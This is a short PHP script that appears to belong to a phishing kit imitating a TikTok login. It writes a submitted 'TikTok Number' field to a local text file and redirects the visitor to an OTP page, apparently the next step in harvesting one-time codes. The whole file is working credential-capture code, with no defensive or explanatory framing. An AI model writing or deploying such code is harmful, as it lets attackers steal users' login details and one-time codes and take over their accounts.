<?php
file_put_contents("usernames.txt", "TikTok Number: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>